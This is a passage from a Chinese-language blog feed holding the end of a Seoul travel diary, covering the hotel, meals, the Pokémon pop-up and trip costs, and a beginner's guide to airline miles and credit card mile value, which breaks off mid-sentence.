韓幣，話說這邊買會比去便利商店買還貴，但因為懶惰省時間，就直接在販賣機買了。</p><p>從機場到弘大大約也要將近一個小時，到車站之後再走個 10 分鐘左右前往飯店，到的時候差不多晚上 6 點。這次的住宿是 <a href="https://maps.app.goo.gl/k8udQW5FosCiPWpb8">Amanti Seoul Hotel</a>，三個晚上合計約 16000 台幣，一個晚上要 5000 多。</p><p>話說我訂完機票之後查住宿感覺選擇滿多，但那時候拖延症發作懶得訂，隔了幾週之後再查發現幾乎沒什麼選擇了，而且價格貴了不少，看來這種事情真的不能拖，趕快下訂比較實在。</p><p>住宿的話我覺得就普普通通吧，雖然說 Google Maps 上面寫四星級，但我自己是感受不到，而且房間燈光滿昏暗的，真的不像有這個等級。但地點的話是滿方便的，離弘大商圈走路大約五分鐘左右而已。附近其實有幾間更方便的，但我查過價錢也更貴，三個晚上要 22000 以上，下不了手。</p><p>在房間裡面短暫休息之後，就前往第一站：BHC 炸雞。</p><p>這間是看 <a href="https://youtu.be/lN70r3a32Q0?si=SjTCrtWTyf-Bk_Vd&t=683">YouTuber</a> 推薦的，也點了他推薦的口味，先來上個圖：</p><p><img src="/img/2024-korea-seoul-travel/p5.jpg" alt="BHC 炸雞"></p><p>味道確實是不錯，不過吃完的心得是兩個人吃還是有點太多了，而且吃到最後面有點膩。價格的話炸雞搭配兩罐飲料是 30000 韓元，台幣 715 塊，滿能接受的。</p><p>吃完炸雞之後就到弘大商圈逛逛，逛完就回去睡覺了。</p><h2 id="Day2：樂天世界塔以及寶可夢"><a href="#Day2：樂天世界塔以及寶可夢" class="headerlink" title="Day2：樂天世界塔以及寶可夢"></a>Day2：樂天世界塔以及寶可夢</h2><p>我太太一直以來都對韓國沒什麼興趣，這次的首爾之旅也是一樣，但很剛好地在去之前幾天，公佈了寶可夢要在首爾開快閃店的消息：<a href="https://holiday.presslogic.com/article/418701/pokemon%E5%B0%8F%E9%8E%AE-%E9%A6%96%E7%88%BE%E6%A8%82%E5%A4%A9-%E6%AF%94%E5%8D%A1%E8%B6%85%E3%80%81%E8%83%8C%E8%83%8C%E9%BE%8D%E3%80%81%E6%B4%BB%E5%8B%95%E8%A9%B3%E6%83%85">「Pokémon小鎮」登陸韓國首爾樂天！打卡巨型背背龍、必買比卡超樂天塔超萌公仔！</a>，於是她突然變得很期待首爾之旅。</p><p>這次去首爾的最主要目的其實是我想搭便宜的商務艙以及來韓國吃吃東西，所以本來就沒有安排什麼景點，行程很隨意，因此第二天就來樂天世界塔看寶可夢。商店跟戶外的園區都是十點半才開，我們差不多將近 11 點到，戶外園區已經排了一圈了。</p><p>看到這個人潮我才想到那天是 5&#x2F;1 勞動節，韓國放假，難怪人這麼多。</p><p>排了大概半小時左右順利進去，不過很多活動都是下午才開始，因此早上就只是進去拍拍照而已：</p><p><img src="/img/2024-korea-seoul-travel/p6.jpg" alt="寶可夢園區皮卡丘"><br><img src="/img/2024-korea-seoul-travel/p7.jpg" alt="寶可夢園區"></p><p>晃了一圈之後就進去室內，排隊方式的話是放了兩台平板，在上面輸入電話就會拿到號碼，而像我們這種沒有韓國電話的外國人就要直接跟工作人員說，就會拿到別的卡片，上面寫著入場時間。我們是 12 點左右排到的，拿到的入場時間是下午 3 點。</p><p>後來就隨便找個地方吃飯，點了豆腐鍋跟全州拌飯，花了 32000 韓幣，折合台幣 760 塊。吃完飯之後繼續在百貨公司內晃來晃去，一直晃到 3 點進場。</p><p>不知道是主辦單位太小看寶可夢的威力，還是租不到更大的場地，整個空間我覺得都有點太小：</p><p><img src="/img/2024-korea-seoul-travel/p9.jpg" alt="寶可夢園區"></p><p>照片拍到的差不多就是全部了，上半部人很多那邊是結帳區，然後左邊那個卡比獸後面還有一小區可以逛，整體空間不大，而且人超級多，動線規劃的也不是很好。更可惜的是樂天世界塔限定的那幾隻還沒開賣，然後先開賣的一些商品似乎也賣完了，因此其實沒什麼可以買。</p><p>我買了一隻這個我覺得很可愛：</p><p><img src="/img/2024-korea-seoul-travel/p10.jpg" alt="雪國皮卡丘"></p><p>逛完之後就回飯店休息一下，晚上出來吃飯，本來想吃之前看好的一間烤肉，到了店門口發現要排隊，於是就隨便吃了附近的另一間韓式烤肉的餐廳，點了兩份肉外加兩碗白飯，吃了 71000 韓幣，約台幣 1700 塊，肉不錯但價格似乎小貴。</p><p>吃完之後繼續去弘大找尋街頭表演，話說這次會住弘大是因為我第一次來首爾的時候就被弘大吸引住了，跳舞的街頭表演很有活力，以前都是在家看 YouTube 上的舞蹈 cover 或是 random dance 之類的，但在現場看感受完全不同，很讚。</p><p><img src="/img/2024-korea-seoul-travel/p11.jpg" alt="弘大表演"></p><h2 id="Day3：弘大申美京辣炒雞排-T1-網咖-汝矣島現代百貨"><a href="#Day3：弘大申美京辣炒雞排-T1-網咖-汝矣島現代百貨" class="headerlink" title="Day3：弘大申美京辣炒雞排 + T1 網咖 + 汝矣島現代百貨"></a>Day3：弘大申美京辣炒雞排 + T1 網咖 + 汝矣島現代百貨</h2><p>這天中午去吃了有名的<a href="https://maps.app.goo.gl/sDnT5fNcUsJ2igko6">弘大申美京辣炒雞排</a>，十一點多到的，店裡空無一人。除了主菜之外還點了一碗白飯來分，因為主菜真的是滿下飯的。</p><p>吃完之後的感想是味道不錯但似乎有點太重口味，有點承受不住，另一個感想是我跟太太一致認同店員很帥。價格是 33000 韓幣，折合台幣 785 元。</p><p>接著下一個行程是就在弘大的 T1 網咖，一進門就可以看到五個人的立牌：</p><p><img src="/img/2024-korea-seoul-travel/p12.jpg" alt="T1 人形立牌"></p><p>還可以跟巨大版的 Faker 公仔合照：</p><p><img src="/img/2024-korea-seoul-travel/p13.jpg" alt="Faker 公仔"></p><p>網咖的部分我就沒嘗試了，只是來這邊逛逛拍拍照而已：</p><p><img src="/img/2024-korea-seoul-travel/p14.jpg" alt="網咖本身"></p><p>朝聖完 T1 網咖以後，就前往汝矣島現代百貨。來這邊純粹只是因為不知道要幹嘛，所以找個地方晃晃而已。在那邊其實也沒特別做什麼，就走著走著休息坐下來看漫畫，喝個藍瓶咖啡邊看漫畫，回家的時候也是邊搭車邊看漫畫。最近剛好迷上韓國漫畫，用 LINE WEBTOON 看著正版的漫畫（有些免費有些要課金，通常是看到後面要課金，我課了大概一千多），很多其實滿好看的，停不下來。</p><p>在那邊晃到下午四點就搭車回飯店了，回去之後開始繼續看漫畫，看到晚上快八點才出門覓食。話說韓國的天超晚才黑，在日本我七點下班天一定是黑的，但是在韓國就算七點半了都還沒黑。</p><p>因為我太太說想吃韓國版的松屋（平價連鎖餐廳），因此這天吃的是平價美食 ssada gimbab，點了一個紫菜飯捲跟泡麵還有一罐飲料，才 12500 韓幣而已，300 塊台幣，確實是滿平價的，味道也不錯，但就是泡麵有點太辣了。</p><p>吃完之後依照慣例去弘大晃晃，跟前幾天都是至少兩人或更多人的表演者不同，這次是一個人獨挑大樑：</p><p><img src="/img/2024-korea-seoul-travel/p15.jpg" alt="弘大表演獨挑大梁"></p><p>查了一下 IG 跟 YouTube，發現 YouTube 上面有 40 萬的訂閱，真的厲害，是一個日本女生但是在韓國發展，當天的表演還有直播紀錄：<a href="https://www.youtube.com/watch?v=VbXTixTyP-Q&ab_channel=YuKagawa%EC%B9%B4%EA%B0%80%EC%99%80%EC%9C%A0">https://www.youtube.com/watch?v=VbXTixTyP-Q&amp;ab_channel=YuKagawa%EC%B9%B4%EA%B0%80%EC%99%80%EC%9C%A0</a></p><h2 id="Day4：幸運壓線再訪寶可夢"><a href="#Day4：幸運壓線再訪寶可夢" class="headerlink" title="Day4：幸運壓線再訪寶可夢"></a>Day4：幸運壓線再訪寶可夢</h2><p>這天要回東京的飛機是下午 3 點半飛，因此下午 1 點半要到機場，等於 12 點左右要出發。原本想說在飯店待到差不多的時間退房然後去機場，但是在前一天晚上接到了一個新消息。</p><p>那就是之前說還沒開賣的世界塔限定娃娃要開賣啦！算一算時間覺得應該來得及，於是事先規劃了一番。</p><p>我太太早上先去排隊，如果人很多就放棄回飯店，人不多就繼續排隊，而我繼續在飯店睡覺，睡到 9 點多再帶著行李搭車過去會合（商店 10:30 才開）。</p><p>寶可夢狂粉如我太太，早上 6 點就出門去排隊了，大概 7 點到，拿到 16 號，順利搶到第一批進去，而我也按照原定計畫退房之後帶著行李過去會合，順利在 10:30 左右進入商店。</p><p>話說在日本這種限定商品一定都有限購，每人限購一隻之類的，但是在韓國場卻發現完全沒有類似的公告，拿著翻譯去問工作人員，他跟我說：no limit，還真的沒有限購，傻眼。於是我只能幫後面進場的人默哀，可能所有娃娃都在前三批就被拿光了，後面的人完全看不到。</p><p>雖然不知道會不會補貨就是了，但根據前兩天去的情形，很有可能不會補。不過活動會到五月底左右，真的不補的話好像有點誇張？之後再繼續觀望一下。</p><p><img src="/img/2024-korea-seoul-travel/p16.jpg" alt="韓國樂天世界塔限定皮卡丘"></p><p>總之呢，照著計畫買了一些東西就跑去附近等機場巴士了，剛好附近有可以直達機場的巴士，而且可以用信用卡在車上付款，很方便，到機場的時候才 12:30 而已，時間還綽綽有餘。因為買太多東西行李箱裝不下，於是就在機場尋找裝箱服務，最左邊跟最右邊都有，買了一個中的箱子是 8000 韓幣，差不多 190 元台幣。</p><p>出境之後發現仁川機場一航廈有夠大，光是從最左邊走到最右邊大概就要個十分鐘了，東西很多，還有看到 riot 的特別專區，可以體驗玩遊戲也可以看到很多裝飾：</p><p><img src="/img/2024-korea-seoul-travel/p17.jpg" alt="機器人"></p><p>貴賓室的話普普通通，東西沒有很多，而且也沒辦法點餐，就不特別寫了。</p><p>如同開頭講過，這次回日本是搭 A330-300，而且飛機是肉眼可見的舊，座位的螢幕是超級舊的那一種，餐點的部分一樣有西式跟韓式，味道一樣都很不錯：</p><p><img src="/img/2024-korea-seoul-travel/p18.jpg" alt="西式餐點"></p><p><img src="/img/2024-korea-seoul-travel/p19.jpg" alt="韓式餐點"></p><p>話說之前好像沒來過成田一航廈，比想像中小滿多的，但入境還是要排隊，這時候就發揮出在日本工作的優點了，憑著再入國許可直接越過重重人潮，花不到兩分鐘就入境了，感覺真好。</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>先來算一下花費。</p><p>機票的話是 32000 台幣，住宿是 16000 台幣，光這兩樣就花了 48000 台幣。</p><p>吃的話是 4260 台幣，吃了五餐而已，平均一餐 850 塊，一個人是 425 元，似乎有點偏高，畢竟我也沒有覺得吃得特別好。</p><p>交通的話一個人大約是 32000 韓幣，折合台幣 760，兩個人就是 1520 元。</p><p>因此這整趟算下來的花費約 54000 元左右，一天 13500 元，一人天 6750 台幣，比起之前我統計過的<a href="https://life.huli.tw/2023/07/27/2023-july-korea-trip-seoul-92ba2d0608ff/#%E8%8A%B1%E8%B2%BB%E7%B8%BD%E7%B5%90">平均數字</a>一人天 4000~5000 來說貴上不少，主要還是住宿太貴的緣故。</p><p>這是我第四次去首爾了，感覺還是不錯的，不過開始漸漸意識到儘管有兩個人，有些東西分食還是不太夠，比較適合人多一點再來，不然吃東西會有點綁手綁腳的，因為份量都太多了。下次如果再去韓國，可能會選首爾釜山以外的地方，例如說大邱（雖然我也已經去過一次就是了），想吃吃看有名的巨松排骨。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哩程新手入門：為什麼要刷卡累積哩程？真的有比較划算嗎？</title>
      <link href="/2024/03/04/credit-card-and-miles-introduction/"/>
      <url>/2024/03/04/credit-card-and-miles-introduction/</url>
      
        <content type="html"><![CDATA[<p>身為一個哩程界的新手，程度大概就只到看了一些網路文章並找了資料之後，覺得可以用哩程來換商務艙機票很划算，僅此而已。就算自己目前有累積了一些哩程，其實還沒有太多開過票的經驗。</p><p>至於原因的話，就是懶吧，每一間航空公司的規則都不一樣，而且有許多東西是規則上不會寫的，例如說票放得多不多，什麼時候的票比較好換之類的，太多東西要研究，就先擱著了。</p><p>但前陣子剛好有些時間，就趁機從源頭開始想一件事情：「累積哩程真的有比較划算嗎？」，研究出來的答案是：「看狀況」，但只講這一句就跟沒講一樣，因此這篇來記錄一下，怎樣的狀況有比較划算，怎樣又沒有。</p><p>這篇適合的對象會是對哩程完全不懂的超級新手，因為我目前的程度大概也只比這個好一點。</p><h2 id="累積哩程的管道以及基礎知識"><a href="#累積哩程的管道以及基礎知識" class="headerlink" title="累積哩程的管道以及基礎知識"></a>累積哩程的管道以及基礎知識</h2><p>想要累積航空公司的哩程，通常就兩個管道最常見：</p><ol><li>搭飛機</li><li>刷卡</li></ol><p>雖然這篇的重點在於第二個管道，但先來講一下第一個，畢竟搭飛機累積哩程本來就是最普遍的手段。</p><p>能靠著第一個管道累積大量哩程的通常都是一些商務客，需要經常出差，所以可以一直飛，一直累積。或是如果經常要飛一些長途航班，可能也會累積到還不錯的哩程，例如說三個月飛一次台灣美國之類的，也會有不少哩程。</p><p>儘管每個人搭飛機都可以辦個會員累積哩程，但是如果沒有經常飛的話，累積到的哩程真的不多。</p><p>舉個例子，從桃園機場到日本成田機場，想知道距離的話可以用這個網站算出來：<a href="http://www.gcmap.com/dist?P=TPE-NRT">http://www.gcmap.com/dist?P=TPE-NRT</a></p><p><img src="/img/credit-card-and-miles-introduction/p1.png" alt="台北到日本距離"></p><p>距離是 1356 哩，那這樣是不是就代表可以累積 1356 的哩程呢？並不是這樣的。</p><p>累積哩程的時候要注意兩個東西，第一個是會員計劃，第二個是艙等。</p><p>先講會員計劃的部分，例如說我搭的可能是日本航空的飛機好了，但其實這趟航班的哩程，不一定只能累積在日航的會員，通常都可以累積到其他有合作的航空公司，例如說國泰航空或是阿拉斯加航空。</p><p>這個合作關係最簡單的方式通常都是看聯盟，目前有三大聯盟，規模由大到小排序如下：</p><ol><li>星空聯盟 Star Alliance</li><li>天合聯盟 Skyteam</li><li>寰宇一家 oneworld</li></ol><p>以台灣人可能比較常搭的航空公司來說，其所屬的聯盟如下：</p><ol><li>星空聯盟：長榮、全日空、聯合航空、新加坡航空</li><li>天合聯盟：華航、大韓、達美</li><li>寰宇一家：國泰、日航、美國航空、英國航空</li></ol><p>並不是每一間航空公司都有加入聯盟，例如說星宇航空目前就沒有。</p><p>聯盟之間的航空基本上都有合作關係，因此你在等待長榮的班機登機時，可能會聽到：「目前邀請星空聯盟金卡夥伴以及商務艙的旅客登機」之類的。</p><p>但其實並不是星空聯盟本身有發行一張「星空聯盟金卡」，而是星空聯盟底下每一間航空公司都有自己的會員計劃，到了某個等級之後，效力就等同於是星空聯盟的金卡。</p><p>舉例來說，底下是長榮的會員表格，分成四種等級：</p><p><img src="/img/credit-card-and-miles-introduction/p2.png" alt="長榮會員表格"></p><p>而這四種等級中，長榮的銀卡就對應著星空聯盟的銀卡，再上去的金卡跟鑽石卡就都是金卡：</p><p><img src="/img/credit-card-and-miles-introduction/p3.png" alt="長榮對應星空聯盟等級"></p><p>所以當我拿到長榮航空的金卡以後，搭乘同個聯盟的全日空，報到時可以跟商務艙用同一個櫃檯，可以進貴賓室，行李也可以變成優先行李。</p><p>讓我們再講回累積哩程這件事情，同理，當我搭乘長榮航空的班機後，我的哩程可以累積在其他夥伴航空公司，不一定要累積在長榮。每間公司都會有不同的表格，去計算說其他航空公司來累積的話，可以累積到多少。</p><p>而這個表格裡面就會有剛剛提到的第二個變因：艙等。</p><p>這個艙等並不只是指經濟艙、商務艙那種，而是會區分得更詳細。下面這是長榮會員計劃，搭乘長榮航班的<a href="https://www.evaair.com/zh-tw/infinity-mileagelands/mileage-award-program/earning-mileage/eva-air-and-uni-air/mileage-accrual-ratio-rule/">表格</a>：</p><p><img src="/img/credit-card-and-miles-introduction/p4.png" alt="艙等表格"></p><p>可以看到就算是經濟艙，也分了三種類型，這是為什麼呢？</p><p>這其實就跟買機票的時候有關啦，通常買機票的時候，就算買了經濟艙，不是也有其他的票價可以選嗎？例如說再貴一點可以優先選位，更貴一點的話取消機票不用錢之類的。</p><p>更好的福利通常都伴隨著更高的價格，因此就算都是經濟艙，細節的艙等也還是不同。我們在講的艙等其實就是上表中的「訂位代碼」，例如說最底下的 S 艙只能累積 50% 的哩程，最上面的 C 艙可以累積 175%。</p><p>底下是長榮航空的購票頁面，可以清楚看到越貴的票福利越好，可以累積的哩程也越多：</p><p><img src="/img/credit-card-and-miles-introduction/p5.png" alt="購票頁面"></p><p>講完了上面這些背景知識以後，終於可以來回答「台灣飛日本單程的距離是 1356 哩，那到底可以累積多少哩程」這個問題了。</p><p>如果是搭乘長榮航空最便宜的經濟艙 S 艙，那只能累積 50%，也就是 1356 * 50% &#x3D; 678 哩，來回的話就是 1356 哩。若搭乘的是商務艙 J 艙，來回就是 1356 * 2 * 150% &#x3D; 4068 哩。</p><p>那如果累積在其他航空公司的話，會有多少呢？這時候可以用另外一個好用的網站：<a href="https://www.wheretocredit.com/calculator#TPE-NRT-BR-J/NRT-TPE-BR-J">https://www.wheretocredit.com/calculator#TPE-NRT-BR-J/NRT-TPE-BR-J</a></p><p><img src="/img/credit-card-and-miles-introduction/p6.png" alt="wheretocredit"></p><p>根據上面的資料，如果累積到中國航空的會員，會有 5672 哩，比長榮還多了 1600 多。不過哩程這東西也不一定是多就好，還需要搭配其他各種因素來看，單看哩程數量是不準的，例如說別的航空公司有可能票比較難換，或是需要的哩程比較多等等。</p><p>除此之外，許多會員計劃內的哩程是會過期的，像長榮是三年，這也是在累積哩程時需要考慮的東西。</p><h2 id="刷卡累積哩程"><a href="#刷卡累積哩程" class="headerlink" title="刷卡累積哩程"></a>刷卡累積哩程</h2><p>剛剛把第一種管道，搭飛機累積哩程談完了，接著來談談刷卡。</p><p>通常刷卡可以累積到的哩程也有兩種，一種是直接累積，另一種是先累積成信用卡點數，再把點數轉到航空公司去，由於後者通常都可以轉多個航空公司，所以會更彈性一點。</p><p>再次以長榮為例，長榮航空的聯名卡就屬於第一種，買長榮機票的話是 10 塊錢一哩，其他一般消費就是 20 塊一哩。</p><p>而滙豐旅人卡則是第二種，以滙豐旅人無限卡來說，海外消費是 10 塊錢一點，國內消費則是 18 塊一點。而這些點數可以用 1:1 的比例轉到華航、長榮、日航等等的航空公司：</p><p><img src="/img/credit-card-and-miles-introduction/p7.png" alt="匯豐旅人卡轉點"></p><p>有另外一種的信用卡，刷了之後是直接現金回饋的，例如說聯邦 LINE Bank 聯名卡，國內消費回饋 2%（雖然說對很多信用卡來說指定管道消費活動帶來的回饋更多，可以到 5%、10% 或更高，但這塊我不熟，就先不談了），而滙豐現金回饋御璽卡，則是國外 2.2%。</p><p>以這種沒有指定通路，只要刷了就會回饋的信用卡來說，能到 3% 就已經算很高了。不過對那些熟悉信用卡的人來說，針對各種管道拿不同的卡刷，我看應該可以到 5%、8% 甚至再更高，例如說這篇就列了一大堆優惠：<a href="https://www.ptt.cc/bbs/creditcard/M.1704126609.A.04E.html">[心得] 2024上半年用卡整理</a>。</p><p>那如果是用累積哩程的信用卡，換算下來的價值有沒有比現金回饋高呢？話又說回來，哩程的價值應該怎麼計算？</p><h2 id="哩程的價值"><a href="#哩程的價值" class="headerlink" title="哩程的價值"></a>哩程的價值</h2><p>哩程其實是可以交易的。</p><p>像是這篇 PTT 點數版的文章：<a href="https://www.ptt.cc/bbs/points/M.1708851533.A.194.html">[ 售 ] 長榮哩程35000</a>，賣 35000 哩程，一點 0.513，總價 18000 台幣。</p><p>這邊的交易其實也有很多種，有一種是付錢之後把哩程轉到你的帳戶，需要注意的是很多航空公司，自己的跟轉入的不能一起用，所以我原本有 5000，別人轉給我 35000，能換到的機票還是只有 35000 的，不會變成 40000。</p><p>再來有些的交易是「我直接幫你開機票」，而不是用點數轉帳的方式（有些會員系統根本沒這功能）。</p><p>總之呢，以長榮航空為例，一哩的價值大約是 0.5~0.52 左右，就算 0.5 好了。</p><p>那以剛剛講到的信用卡為例，如果 20 元一哩，就代表是 20 元回饋 0.5 元，回饋率是 2.5%，如果是 10 元一哩，那回饋率就是 5%。</p><p>聽起來好像很不錯？</p><p>不過還有很多細節要考慮，就如同剛提到的，自己的哩程跟別人轉的不能共用，所以通常都會累積到一個量才會有人買，而且並不是每個數目都有人買。</p><p>舉例來說，日航換一張單程的台灣到日本經濟艙機票，最低是 2 萬哩，因此就算你有 23000 哩，那 3000 可能也不會有人買，因為他只需要 2 萬。必須存到下一個數量，才能一起賣掉。</p><p>換句話說，哩程要賣得掉，是有一個最低門檻跟級距的。</p><p>我們先假設這個最低門檻是 20000 哩好了，如果信用卡是 20 元一哩，那就必須要刷 40 萬台幣，才能集到 20000 哩。</p><p>這就是在考慮該用現金回饋卡還是哩程卡時，可以先思考的一個角度。如果你的刷卡消費一年才 10 萬，那三年 30 萬，可以換的哩程只有 15000 哩，很可能會賣不掉，此時用現金回饋卡或許會是更好的選擇。</p><p>再者，賣哩程還要找買家，也需要承擔網路交易會有的風險，如果回饋率沒有到這麼高，那不如就別自找麻煩，無腦刷現金回饋卡就好了。</p><p>但如果你的消費滿高，一年可以刷個 3、40 萬台幣，用的卡又比較高階，是那種 10 塊錢 1 哩的，就代表一年可以累積至少 30000 點，拿去賣的話直接變成 5% 現金回饋，或許就可以考慮累積哩程。</p><p>等等，還沒結束，這還不是結論。</p><p>剛剛都只有討論「哩程交易」的情形，並沒有談到「拿哩程去換機票」這件事情，那如果拿哩程換機票，回饋率又有多少？</p><h2 id="用哩程換機票，帶來的價值有多少？"><a href="#用哩程換機票，帶來的價值有多少？" class="headerlink" title="用哩程換機票，帶來的價值有多少？"></a>用哩程換機票，帶來的價值有多少？</h2><p>為了之後方便計算，我先假設信用卡是 10 塊錢 1 哩的卡片（如滙豐旅人無限卡，我就是用這張而且覺得滿好用的）。</p><p>滙豐旅人無限卡可以轉點的夥伴很多，底下我用長榮跟日航當作範例。</p><p>長榮航空的話，兌換表格如下：</p><p><img src="/img/credit-card-and-miles-introduction/p8.png" alt="長榮兌換表格"></p><p>以台灣人最喜歡去的日本為例，兌換一張經濟艙來回機票是 35000 哩，商務艙則是 50000 哩。</p><p>飛紐約的話，經濟艙是 110000 哩，商務艙是 160000 哩。</p><p>其實從這個兌換表格就可以知道為什麼有很多人說：「哩程換商務艙比較划算」，因為用現金買機票的話，商務艙通常會是經濟艙的兩倍起跳，但哩程卻不是。</p><p>接著我們隨意來找個機票：</p><p><img src="/img/credit-card-and-miles-introduction/p9.png" alt="桃園東京經濟艙"></p><p>台灣飛東京經濟艙，來回 14400 台幣。</p><p>用 35000 哩程去換的話，等於說一哩的價值就是 14400&#x2F;35000 &#x3D; 0.4 台幣，比拿去交易還不划算。</p><p>那如果是商務艙呢？</p><p><img src="/img/credit-card-and-miles-introduction/p10.png" alt="桃園東京商務艙"></p><p>商務艙的話是 35000 台幣，一哩的價值是 35000&#x2F;50000，一哩是 0.7 台幣！換算下來就是 7% 的回饋，遠大於現金卡的 3%。</p><p>不過這算法其實有個問題，那就是沒有考慮到稅金跟其他費用。一張機票的價格除了機票本身，也包含了其他各種費用，用其他更專業的網站（如  <a href="https://matrix.itasoftware.com/search">ITA</a>）來查，就可以看到細節：</p><p><img src="/img/credit-card-and-miles-introduction/p11.png" alt="稅金"></p><p>像這張 39748 元的票，機票本身的價格是 36500 塊，剩下的 3248 元包含：</p><ol><li>台灣機場服務費 500 元</li><li>燃油附加費（Carrier-imposed surcharge） 1899 元</li><li>日本機場服務費 637 元</li><li>日本遊客稅 212 元</li></ol><p>當你用哩程開票時，能夠避開的只有機票本身的價格，上面這些其他的是避不開的。</p><p>因此，當我們用 50000 哩去換價值 35000 的商務艙機票時，要考慮到這些額外費用，一哩的價值變成 ((35000 - 3248)&#x2F;50000) &#x3D; 0.63 元台幣。</p><p>接著我們來看長程線，台灣飛紐約：</p><p><img src="/img/credit-card-and-miles-introduction/p12.png" alt="台灣紐約經濟艙"></p><p>經濟艙是 56672 元。</p><p><img src="/img/credit-card-and-miles-introduction/p13.png" alt="台灣紐約商務艙"></p><p>商務艙是 204791 元，哇。</p><p>其他那些稅什麼的我幫大家算好了，是 6717 元。</p><p>結合前面講的經濟艙是 110000 哩，商務艙是 160000 哩，換算的結果如下。</p><p>經濟艙一哩是 (56672-6717) &#x2F; 110000 &#x3D; 0.45 元，不如賣掉。</p><p>商務艙一哩是 (204791-6717) &#x2F; 160000 &#x3D; 1.23 元！</p><p>刷 10 塊錢一哩，一哩 1.23 元，就等於是 12.3% 的回饋了！這就是為什麼許多人喜歡用哩程來換長途商務艙，因為從這個角度來看的話，根本超級划算。</p><p>不過要注意之前講的前提，你要累積到 16 萬的哩程，得先刷到 160 萬台幣，分三年一年也要刷 50 萬，很多人可能沒辦法刷到這個金額。</p><h2 id="日航的兌換標準"><a href="#日航的兌換標準" class="headerlink" title="日航的兌換標準"></a>日航的兌換標準</h2><p>看完了長榮，我們來看看另外一間日本航空。</p><p>這邊幫大家節省時間，就不附圖了。</p><p>一樣以 5&#x2F;17 ~ 5&#x2F;24 桃園東京來回航班為例，現金買經濟艙是 13773 元，商務艙是 25000 元（剛好特價），用哩程兌換的話，經濟艙是 20000 哩，商務艙是 48000 哩，但稅費很可怕，是 6263 元。</p><p>經濟艙一哩是 (13773-6263) &#x2F; 20000 &#x3D; 0.37 元，不如賣掉。</p><p>商務艙一哩是 (25000-6263) &#x2F; 48000 &#x3D; 0.39 元，也不如賣掉。</p><p>不過這是因為剛好碰到商務艙在特價的緣故，因此才這麼不划算，如果是沒有特價的時候，商務艙大概要個 35000，換算下來一哩就是 0.49，跟賣掉其實也差不多，但至少比 0.39 好。</p><p>像是這種現金票在特價的時候，用哩程換就沒這麼划算。</p><p>再來一樣是看長途線，東京飛舊金山，經濟艙是 65000 元，商務艙是 16 萬，用哩程的話經濟艙「表定最低」是 5 萬哩，商務艙是 10 萬哩，而稅金是 2 萬台幣。</p><p>經濟艙一哩是 (65000-20000) &#x2F; 50000 &#x3D; 0.9 元。</p><p>商務艙一哩是 (160000-20000) &#x2F; 100000 &#x3D; 1.4 元。</p><p>看起來兩個都相當划算，一個是 9% 回饋，另一個是 14%。</p><h2 id="用哩程換機票真的這麼划算嗎？"><a href="#用哩程換機票真的這麼划算嗎？" class="headerlink" title="用哩程換機票真的這麼划算嗎？"></a>用哩程換機票真的這麼划算嗎？</h2><p>剛剛我們已經用長榮跟日航的現金票價以及哩程兌換的換算來驗證過了，短程商務艙可以帶來 6% 以上的回饋價值，長程更是可以帶來 10% 以上，看起來非常不錯。</p><p>不過，剛剛的換算其實建立在兩個前提之上：</p><ol><li>哩程兌換標準不變</li><li>換得到機票</li></ol><p>先講第一點，剛剛在聊日航時有特別強調「表定最低」，會這樣講是因為現在許多航空公司的哩程兌換改成浮動制，需求多的話，需要的哩程也會變多，因此實際要換的日子可能不一定是這個價格。</p><p>舉例來說，我剛查的一張 10 月的機票，一樣是日本到舊金山來回，需要的是 376000 哩加上 2 萬台幣，一哩的價值就變成 (160000-20000) &#x2F; 376000 &#x3D; 0.37，非常不划算。</p><p>除此之外，哩程本身也有可能貶值，意思是航空公司改了兌換表格，通常都是越改越差，需要的哩程會變得更多，此時價值就又掉下來了。</p><p>而第二點更為重要，對航空公司來說還是現金票最賺錢，所以一個航班一定是現金票佔大多數，哩程票可以兌換的位子少很多，尤其是商務艙，可能一個航班才一個或兩個位子。</p><p>意思是你不一定能換到理想中的日子的機票。</p><p>因此，哩程票的玩法就比較適合旅遊日期彈性的人，否則有可能換不到機票，那哩程就沒什麼用了。</p><p>另外，如果你願意多花一些時間研究，有可能利用轉機、中停或是外站等等的方式讓哩程票的價值更大，不知道什麼是外站的話可以參考我之前簡單寫過的：<a href="https://life.huli.tw/2022/12/28/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/">長榮外站出發日本便宜機票購買心得</a>。</p><p>最後是一個我覺得另外一個很適合用哩程票的方式，那就是買單程機票。</p><p>用哩程換機票時很簡單，來回通常就是單程 * 2，但是自己用現金買機票的時候通常都不是，很有可能來回只要 12000，但單程卻要 8000 元，這時候用哩程票就會比較划算一點。</p><h2 id="我自己用哩程換票的經驗"><a href="#我自己用哩程換票的經驗" class="headerlink" title="我自己用哩程換票的經驗"></a>我自己用哩程換票的經驗</h2><p>我自己到目前為止只有兩次經驗而已。</p><p>第一次是 2018 年的時候從新加坡工作回台灣，在 PTT 上面徵了新航哩程，27500 哩換一張新加坡往台北的單程商務艙機票，一哩 0.4 元，花了 11000 台幣。</p><p>那時候的交易就是用前面講的開票的形式，賣哩程的人會先把帳號借你用，你自己開完票以後還他。</p><p>如果是用現金買這張票的話，我記得少說也要個兩萬以上，直接省了一半。</p><p>第二次剛好是在最近，用以前累積的阿拉斯加航空哩程換了星宇航空的台北飛日本單程商務艙，超級划算。</p><p>只要 15000 哩程加上 30 塊美金而已。</p><p>阿拉斯加航空本身大概每一兩個月會有一次哩程特賣，最低都可以拿到 40% 的加成，換算下來一哩 0.66 元，因此這張機票的取得成本大約也是 11000 台幣，現金買的話一樣至少 2 萬，賺！</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>有一點要先讓大家知道，這篇文章的前提是：「不需要花太多心力研究的狀況下，刷卡累積哩程的價值到底是多少？」</p><p>這是什麼意思呢？</p><p>如同前面所講過的，無論是信用卡還是哩程，想要發揮最大的價值，一定都是要花許多的心力去研究。有研究跟沒研究，最後的結果可能會差到兩倍以上。</p><p>舉例來說，方才有提到現金回饋卡，不看活動跟指定管道的話，3% 就已經算滿多的了。但真的懂玩的人就會說：「欸不是，刷卡的重點本來就是那個活動」，針對各種管道刷不同的卡，登錄不同的活動，有可能光是刷這種現金回饋的卡，就已經能拿到 8% 或更高的優惠了。</p><p>而哩程卡也類似，有很多 base 